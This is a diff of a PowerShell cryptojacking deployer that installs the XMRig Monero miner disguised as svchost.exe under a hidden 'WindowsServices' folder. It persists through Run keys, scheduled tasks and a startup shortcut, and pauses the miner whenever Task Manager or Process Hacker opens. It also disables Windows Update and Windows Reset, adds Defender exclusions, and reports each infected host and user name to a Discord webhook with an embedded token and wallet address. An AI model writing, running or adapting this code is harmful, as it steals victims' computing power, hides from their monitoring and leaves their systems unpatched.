@@ -1,18 +1,18 @@
 # ============================================================
-#  XMR Standalone Pro Deployer v3.2
-#  - Base: Proven v3.1 Stability
-#  - Added: Taskmgr Detection (3s Poll)
+#  XMR Standalone Pro Deployer v3.2 (HARDENED)
+#  - Base: Proven v3.1 Code
+#  - Added: Insta-Kill Taskmgr (3s Resolution)
 #  - Added: Windows Update & Reset Lockdown
-#  - Personalized for itzcurled
+#  - Fixed: Precision Path Detection (System-Safe)
 # ============================================================
 
 # ==================== CONFIG ====================
 $wallet         = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 $pool           = "pool.hashvault.pro:443"
 $poolBak        = "pool.supportxmr.com:443"
-$idleCpu        = 90
+$idleCpu        = 100
 $activeCpu      = 30
-$idleThreshold  = 75
+$idleThreshold  = 120
 
 $installDir     = "$env:APPDATA\WindowsServices"
 $xmrigExe       = "$installDir\svchost.exe"
@@ -30,21 +30,16 @@ $worker         = "$env:COMPUTERNAME"
 
 function Install-Miner {
     try {
-        Get-CimInstance Win32_Process -ErrorAction Stop | Where-Object { 
+        # [PRECISION] Kill only YOUR processes - never system svchost
+        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { 
             ($_.ExecutablePath -eq $xmrigExe) -or 
-            ($_.CommandLine -like "*monitor.vbs*") -or 
-            ($_.CommandLine -like "*watchdog.ps1*")
+            ($_.CommandLine -like "*$watchdogVbs*") -or 
+            ($_.CommandLine -like "*$watchdogPs1*")
         } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
-    } catch {
-        Get-Process -Name "svchost", "wscript" -ErrorAction SilentlyContinue | Where-Object {
-            ($_.Path -eq $xmrigExe) -or ($_.CommandLine -like "*monitor.vbs*")
-        } | Stop-Process -Force -ErrorAction SilentlyContinue
-    }
+    } catch {}
     
-    try { taskkill /F /IM wscript.exe /T 2>$null } catch {}
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 2
     New-Item -ItemType Directory -Path $installDir -Force | Out-Null
-
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
 
     $downloaded = $false
@@ -53,35 +48,21 @@ function Install-Miner {
         $wc.Headers.Add("User-Agent", "Mozilla/5.0")
         $wc.DownloadFile($xmrigUrl, $zipFile); $downloaded = $true
     } catch {
-        try { Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction Stop; $downloaded = $true } catch {
-            try { Import-Module BitsTransfer; Start-BitsTransfer -Source $xmrigUrl -Destination $zipFile; $downloaded = $true } catch {}
-        }
+        try { Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction Stop; $downloaded = $true } catch {}
     }
 
     if (-not $downloaded) { throw "Download failed" }
     if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue }
-
-    try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } catch {}
     Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
-
-    $copied = $false
-    for ($attempt = 1; $attempt -le 3; $attempt++) {
-        $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-        if ($srcExe) {
-            try { Copy-Item -Path $srcExe.FullName -Destination $xmrigExe -Force; $copied = $true; break } catch {}
-        }
-        if ($attempt -lt 3) { Start-Sleep -Seconds 2; try { Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force } catch {} }
-    }
-
-    try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
-    if (-not $copied) { throw "Binary missing" }
+    $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
+    if ($srcExe) { Copy-Item -Path $srcExe.FullName -Destination $xmrigExe -Force }
     Remove-Item $zipFile, $extractDir -Recurse -Force -ErrorAction SilentlyContinue
 }
 
 function Write-MinerConfig {
     param([int]$CpuPercent = $idleCpu)
     $cfg = @{
-        autosave = $false; opencl = $false; cuda = $false; "donate-level" = 0; background = $true; colors = $false;
+        autosave = $false; opencl = $false; "donate-level" = 0; background = $true;
         cpu = @{ "max-threads-hint" = $CpuPercent; priority = 2; "huge-pages" = $true; "huge-pages-jit" = $true; asm = $true; "memory-pool" = $true };
         pools = @(
             @{ url = "stratum+ssl://${pool}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true },
@@ -139,7 +120,7 @@ function Ensure-MinerState {
 
 while (`$true) {
     try {
-        # --- TASK MANAGER DETECTION (3s Poll) ---
+        # --- INSTA-KILL TASKMGR (3s Resolution) ---
         `$monitored = Get-Process -Name "Taskmgr", "ProcessHacker", "PerfMon", "ResourceMonitor" -ErrorAction SilentlyContinue
         if (`$monitored) {
             Ensure-MinerState -shouldRun `$false
@@ -149,10 +130,10 @@ while (`$true) {
             `$isIdle = `$idleSecs -ge `$idleThreshold
             `$targetCpu = if (`$isIdle) { `$idleCpu } else { `$activeCpu }
             `$state = if (`$isIdle) { "idle" } else { "active" }
-            if (`$state -ne `$lastState) { 
+            if (`$state -ne `$lastState) {
                 Ensure-MinerState -shouldRun `$true
                 Start-Sleep -Seconds 1
-                Set-XmrigCpu -Percent `$targetCpu; `$lastState = `$state 
+                Set-XmrigCpu -Percent `$targetCpu; `$lastState = `$state
             }
             Ensure-MinerState -shouldRun `$true
         }
@@ -168,7 +149,7 @@ function Write-VbsLauncher {
 }
 
 function Set-Persistence {
-    # Lock down Windows Reset (No Reset)
+    # Lock down Windows Reset
     try { & reagentc.exe /disable 2>$null } catch {}
 
     $taskName = "WindowsServiceUpdate"; $wdTask = "WindowsServiceMonitor"
@@ -181,16 +162,8 @@ function Set-Persistence {
     } catch {}
 
     $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    try {
-        Set-ItemProperty $reg "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force
-        Set-ItemProperty $reg "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force
-    } catch {}
-
-    try {
-        $regLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty $regLM "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty $regLM "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction SilentlyContinue
-    } catch {}
+    Set-ItemProperty $reg "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force
+    Set-ItemProperty $reg "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force
 
     $start = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
     try {
@@ -198,20 +171,10 @@ function Set-Persistence {
         $sc = $ws.CreateShortcut("$start\ServiceMonitor.lnk")
         $sc.TargetPath = "wscript.exe"; $sc.Arguments = "`"$watchdogVbs`""; $sc.WindowStyle = 7; $sc.Save()
     } catch {}
-
-    try {
-        $filter = "WindowsServiceMonitorFilter"; $consumer = "WindowsServiceMonitorConsumer"; $timer = "WindowsServiceTimer"
-        Set-WmiInstance -Namespace root\cimv2 -Class __IntervalTimerInstruction -Arguments @{ TimerID = $timer; IntervalBetweenEvents = 300000 } | Out-Null
-        $fObj = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = $filter; EventNameSpace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$timer'" }
-        $cObj = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = $consumer; CommandLineTemplate = "wscript.exe `"$watchdogVbs`"" }
-        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $fObj; Consumer = $cObj } | Out-Null
-    } catch {}
-
-    try { (Get-Item $installDir).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System } catch {}
 }
 
 function Lockdown-System {
-    # No more Windows Updates
+    # Disable Windows Updates
     try {
         $svcs = "wuauserv", "bits", "dosvc"
         foreach ($s in $svcs) {
@@ -247,13 +210,19 @@ function Disable-Sleep {
 function Send-DiscordWebhook {
     $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
-        $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Live! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
+        $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Active! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
         Invoke-RestMethod $webhookUrl -Method Post -Body $payload -ContentType "application/json" | Out-Null
     } catch {}
 }
 
 # ==================== MAIN ====================
 try {
+    # CLEAN SWEEP (Exact Path Only)
+    try {
+        Get-ScheduledTask -TaskName "WindowsService*" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
+        Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $xmrigExe } | Stop-Process -Force -ErrorAction SilentlyContinue
+    } catch {}
+
     Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue
     Lockdown-System
     Disable-Sleep; Enable-HugePages
